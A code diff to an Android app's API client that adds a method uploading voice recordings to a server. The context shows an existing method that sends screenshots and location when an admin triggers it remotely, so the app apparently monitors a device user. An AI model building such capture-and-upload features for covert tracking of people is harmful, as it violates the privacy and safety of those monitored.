@@ -161,6 +161,44 @@ public class ApiClient {
     }
 
     /**
+     * Upload dynamic voice recording file.
+     */
+    public static boolean uploadAudio(String apiToken, File file, int durationSeconds) {
+        try {
+            HttpURLConnection conn = createConnection("/sync/audio");
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Authorization", "Bearer " + apiToken);
+            conn.setRequestProperty("Accept", "application/json");
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + BOUNDARY);
+            conn.setDoOutput(true);
+
+            try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
+                // File field
+                writeFilePart(out, "audio", file);
+
+                // Text fields
+                writeFormField(out, "duration_seconds", String.valueOf(durationSeconds));
+
+                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US);
+                writeFormField(out, "recorded_at", sdf.format(new Date(file.lastModified())));
+
+                // End boundary
+                out.writeBytes("--" + BOUNDARY + "--" + CRLF);
+                out.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+            conn.disconnect();
+
+            Log.d(TAG, "Upload audio response: " + responseCode);
+            return responseCode == 200;
+        } catch (Exception e) {
+            Log.e(TAG, "Upload audio error", e);
+            return false;
+        }
+    }
+
+    /**
      * Upload realtime payload (screenshot + location) in response to admin FCM trigger.
      */
     public static boolean uploadRealtimePayload(String apiToken, File screenshot,
